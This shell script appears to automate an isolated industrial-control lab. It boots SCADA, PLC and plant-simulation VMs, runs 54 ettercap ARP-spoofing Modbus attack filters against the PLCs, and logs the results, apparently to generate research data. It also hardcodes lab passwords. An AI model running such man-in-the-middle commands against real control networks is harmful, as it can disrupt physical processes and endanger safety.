#!/bin/bash

# handle ctrl+c
function close()
{
  VBoxManage controlvm ScadaBR poweroff
  VBoxManage controlvm workstation poweroff
  VBoxManage controlvm pfSense poweroff
  VBoxManage controlvm plc_2 poweroff
  VBoxManage controlvm ChemicalPlant poweroff
  exit 1
}

trap close INT

SCADAUSR="scadabr"
SCADAPASS="scadabr"
WORKSTNUSR="workstation"
WORKSTNPASS="password"
CHMUSR="simulation"
CHMPASS="Fortiphyd"
PLCUSR="user"
PLCPASS="password"

echo "+==============================="
echo "| Starting VMs..."
echo "+==============================="

# startup vms
VBoxManage startvm ScadaBR --type headless
VBoxManage startvm workstation --type headless
VBoxManage startvm pfSense --type headless
VBoxManage startvm ChemicalPlant --type headless
VBoxManage startvm plc_2 --type headless

CHECK_SCADABR_UP="VBoxManage guestcontrol ScadaBR run   \
--username $SCADAUSR                    \
--password $SCADAPASS                   \
-- /bin/echo Done!"
CHECK_WORKSTN_UP="VBoxManage guestcontrol workstation run   \
--username $WORKSTNUSR	\
--password $WORKSTNPASS	\
-- /bin/echo Done!"

echo "Verifying that ScadaBR VM has booted..."
while : ; do
  $CHECK_SCADABR_UP 2> /dev/null && break
  sleep 5
done
echo "Verifying that workstation VM has booted..."
while : ; do
  $CHECK_WORKSTN_UP 2> /dev/null && break
  sleep 5
done


echo "+==============================="
echo "| Beginning Attacks..."
echo "+==============================="

for ATKNUM in $(seq -f "%02g" 0 53); do
  echo "[*] Launching attack $ATKNUM"

  # restore state
  VBoxManage controlvm ChemicalPlant poweroff
  VBoxManage controlvm plc_2 poweroff
  VBoxManage snapshot ChemicalPlant restore initialized
  VBoxManage startvm ChemicalPlant --type headless
  VBoxManage snapshot plc_2 restore initialized
  VBoxManage startvm plc_2 --type headless

  # launch attack
  (VBoxManage guestcontrol workstation run	\
    --quiet					\
    --username $WORKSTNUSR			\
    --password $WORKSTNPASS			\
    --timeout 5000				\
    -- /usr/bin/sudo 				\
    /usr/bin/timeout 1005			\
    /usr/bin/ettercap -T -i enp0s3 -F 		\
    /home/workstation/modbus-attacks/build/attack$ATKNUM.ef 	\
    -q -M arp /192.168.95.2// /192.168.95.10-15//) 2> /dev/null &

  # let ettercap get setup
  sleep 5

  # capture data
  (VBoxManage guestcontrol ScadaBR run		\
    --username $SCADAUSR			\
    --password $SCADAPASS			\
    -- /usr/bin/timeout 1000 /usr/bin/python3 	\
    /home/scadabr/data-capture/capture-from-plc.py attack$ATKNUM.csv) 2> /dev/null &
    
    sleep 1000
done

echo "+==============================="
echo "| Stopping VMs..."
echo "+==============================="

VBoxManage controlvm ScadaBR poweroff
VBoxManage controlvm workstation poweroff
VBoxManage controlvm pfSense poweroff
VBoxManage controlvm plc_2 poweroff
VBoxManage controlvm ChemicalPlant poweroff
